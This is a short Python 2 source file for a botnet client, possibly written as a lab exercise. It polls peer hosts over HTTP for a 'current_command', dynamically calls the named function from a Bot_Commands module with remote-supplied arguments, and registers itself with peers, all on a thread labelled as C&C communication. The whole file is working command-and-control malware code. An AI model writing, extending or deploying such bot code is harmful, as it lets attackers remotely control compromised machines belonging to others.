#!/usr/bin/env python2.7
# coding=UTF-8
import logging, random, time, json, string
import blinker
# from blinker import signal
from threading import Thread
from tornado.httpclient import HTTPClient

from AbstractBot import AbstractBot, executeBot
import Bot_Commands

http_client = HTTPClient()
PORT = 8080


class Bot(AbstractBot):
    def __init__(self, peerlist=[]):
        AbstractBot.__init__(self, peerlist, prob=0.1)
        self.current_command = None

    def performDuty(self, args):
        if len(self.peerlist) > 0:
            blub = http_client.fetch("http://%s:%s/current_command" % (random.choice(self.peerlist), PORT),
                                     headers={"Accept": "application/json"})
            print "blub: " + blub.body
            response = json.loads(blub.body)
            if isinstance(response, dict) and response.has_key("command"):
                methodToCall = getattr(Bot_Commands, response["command"])
                try:
                    methodToCall(**response["kwargs"])
                except TypeError:
                    logging.warning(
                        "Kommand %s mit falschen argumenten aufgerufen: %s" % (response["command"], response["kwargs"]))

            http_client.fetch("http://%s:%s/register" % (random.choice(self.peerlist), PORT),
                              method='POST', body="id=%d" % self.id)


if __name__ == "__main__":
    logging.basicConfig(format="%(threadName)s: %(message)s", level=logging.INFO)

    logging.info("Starting to mess things up")
    bot = Bot(peerlist=["localhost"])
    Thread(name="cnc_comm_thread", target=executeBot, args=(bot, 5)).start()

    time.sleep(35)
    blinker.signal("stop").send()
    logging.info("Everything messed up pretty thoroughly")
